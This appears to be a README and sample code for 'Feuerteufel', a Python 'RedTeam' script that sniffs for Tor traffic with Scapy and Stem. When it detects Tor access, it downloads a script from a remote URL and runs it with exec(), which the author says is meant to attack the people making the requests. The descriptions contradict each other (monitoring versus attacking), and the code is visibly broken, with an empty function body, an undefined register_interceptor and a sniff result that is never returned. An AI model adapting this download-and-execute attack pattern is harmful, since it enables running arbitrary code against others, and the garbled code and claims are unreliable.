# Feuerteufel - A Python Script for Intercepting API Requests
###### RedTeam Script (EDU) by Volkan Sah - simple codings for 'Offensive Security' (updated 5/2023)

Feuerteufel is a small Python script that demonstrates how to intercept requests and execute additional actions when accessed through the Tor network. The script is designed to showcase the interception capability and provides a template for further customization. However, it is important to note that engaging in such activities can have serious legal and ethical implications.

### WARNING: USE AT YOUR OWN RISK!
Please read the following warnings and considerations carefully before proceeding:

- Legal Compliance: Interfering with network traffic and executing external scripts without proper authorization can be illegal in many jurisdictions. Ensure that you fully understand and comply with the laws and regulations of your country or region before using this script.

- Ethical Responsibility: Respect the privacy and security of others. Do not use this script for malicious purposes, personal gain, or any activity that could cause harm or violate the rights of individuals or organizations. It is crucial to conduct ethical testing and obtain appropriate consent before performing any actions that may impact systems or networks.

- Personal Liability: The author of this script cannot be held responsible for any misuse, damages, legal issues, or consequences resulting from the use of this script. By using InterceptAPI, you assume full responsibility for your actions and any outcomes that may arise.

### Note 
This script is intended for educational and informational purposes only. It serves as a starting point for understanding API interception techniques and should be used responsibly and legally.

## Tor Traffic Monitoring Script

This script monitors and intercepts Tor traffic to detect and handle malicious activity. It utilizes the Scapy and Stem libraries to analyze network packets and interact with the Tor network.

## Features

- Monitors and intercepts Tor traffic in real-time.
- Detects malicious traffic based on specified keywords.
- Executes an external script for further analysis or actions like attacks
- Excludes malicious Tor relays from the circuit.

## Prerequisites

- Python 3.x
- Scapy library (`pip install scapy`)
- Stem library (`pip install stem`)

## Usage

1. Set the desired `.onion` address to monitor in the `onion_address` variable.
2. Customize the keywords for detecting malicious traffic in the `MaliciousTrafficListener` class.
3. Run the script and observe the output for detected malicious traffic.
4. Customize the `intercept_api_requests` function to handle intercepted API requests.
5. Adjust the local address or URL of the external script as needed.
6. Execute the `exclude_malicious_relays` function to add malicious relays to the circuit blacklist or create a whitelist with it ðŸ˜…

## Important Note

Executing code fetched from the internet or local sources can be risky. 
Ensure that you trust the source and contents of the external script before loading and executing it.

## How it Works
InterceptAPI utilizes the power of Python, Scapy, and Stem libraries to intercept API requests and perform additional actions. When accessed through the Tor network, the script can load and run an external script from a specified URL. It provides a basic framework that can be customized to meet specific requirements or integrate with other security tools.

A creative small Python script that intercepts API requests and, when accessed through the Tor network, loads and runs an external script from a specified URL to Fuck them!
However, keep in mind that this is a highly risky and potentially illegal activity. Use at your own risk and only against crime and child abuse!
## Sorry cant explane all or you know what can be!

## WARNING: READ CAREFULLY! !!! DANGER !!!
This Black Python script example is intended for use by security professionals and developers only. It is not intended for malicious purposes, and I cannot be held responsible for any misuse of this code. If you use this tool for illegal or unethical purposes, you alone will be held responsible for any consequences that may arise, including legal and ethical issues.

### Be aware that attempting to bypass security measures is likely illegal and unethical!
Idea:
```python
import requests

def intercept_api_requests(request):
    if check_if_accessed_over_tor(request):
        external_script_url = "https://example.com/external_script.py"
        response = requests.get(external_script_url)
        if response.status_code == 200:
            exec(response.text)
        else:
            print("Failed to load the external script.")

def check_if_accessed_over_tor(request):
    # Implement your logic to detect if the request is coming from the Tor network
    # This might involve inspecting the request headers or analyzing network traffic

# Register the interceptor function to intercept API requests
register_interceptor(intercept_api_requests)
```


Example:
```python
from scapy.all import *
from stem import Signal
from stem.control import Controller
import requests

def check_if_tor_traffic(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 443:
        with Controller.from_port(port = 9051) as controller:
            controller.authenticate()
            if controller.get_info("address") == packet[IP].dst:
                return True
    return False

def sniff_packets():
    packets = sniff(filter="tcp and (port 9050 or port 9051)", prn=check_if_tor_traffic)

def intercept_api_requests(request):
    if sniff_packets():
        # This is where you would load and execute your external script.
        # Remember that executing code fetched from the internet can be risky.
        external_script_url = "https://example.com/external_script.py"
        response = requests.get(external_script_url)
        if response.status_code == 200:
            exec(response.text)
        else:
            print("Failed to load the external script.")
```
